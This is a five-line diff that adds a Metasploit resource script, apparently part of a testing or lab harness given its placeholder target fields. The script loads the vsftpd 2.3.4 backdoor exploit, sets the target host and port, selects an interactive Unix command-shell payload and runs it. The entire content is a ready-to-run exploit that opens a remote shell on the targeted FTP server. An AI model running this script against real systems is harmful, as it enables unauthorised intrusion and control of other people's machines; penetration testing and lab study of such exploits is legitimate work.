@@ -1,0 +1,5 @@
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS %%TARGET_IP%%
+set RPORT %%TARGET_PORT%%
+set PAYLOAD cmd/unix/interact
+run
